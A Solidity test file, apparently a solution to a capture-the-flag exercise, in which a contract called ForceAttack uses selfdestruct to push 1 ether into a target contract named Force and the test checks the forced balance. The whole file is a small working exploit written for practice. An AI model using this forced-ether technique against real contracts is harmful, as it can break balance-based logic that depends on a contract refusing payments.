// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {Force} from "../src/Force.sol";

contract ForceAttack {
    constructor() payable {}
    receive() external payable {}

    function exploit(address fc) public {
        selfdestruct(payable(fc));
    }
}

contract ForceTest is Test {
    Force public fc;
    ForceAttack public fcAttack;

    address alice = address(1);

    function setUp() public {
        fc = new Force();
        fcAttack = new ForceAttack{value: 1 ether}();
    }

    function testAttack() public {
        vm.prank(alice);
        fcAttack.exploit(address(fc));

        assertEq(address(fc).balance, 1 ether);
    }
}
